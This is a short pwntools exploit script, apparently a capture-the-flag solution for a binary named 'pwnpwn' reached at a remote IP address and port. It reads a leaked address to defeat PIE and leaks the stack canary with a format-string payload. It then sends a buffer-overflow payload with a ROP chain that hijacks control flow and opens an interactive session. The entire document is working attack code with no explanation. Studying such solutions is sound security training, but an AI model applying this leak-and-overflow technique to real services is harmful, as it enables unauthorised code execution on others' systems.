from pwn import *
#context.log_level='debug'
#r=process('./pwnpwn')
r=remote('124.71.156.217','49153')
r.recv()
r.sendline('1')
r.recvuntil("let us give you some trick\n")
leak=int(r.recv(15),16)
base=leak-0x9b9
print(hex(leak))
r.sendline('2')
r.recv()
payload='%21$p'
r.sendline(payload)
r.recv(2)
canary=int(r.recv(0x12),16)
print(hex(canary))
payload='a'*(0x70-8)+p64(canary)+'a'*8+p64(base+0xb83)+p64(base+0x202010)+p64(base+0x951)
r.sendline(payload)
r.interactive()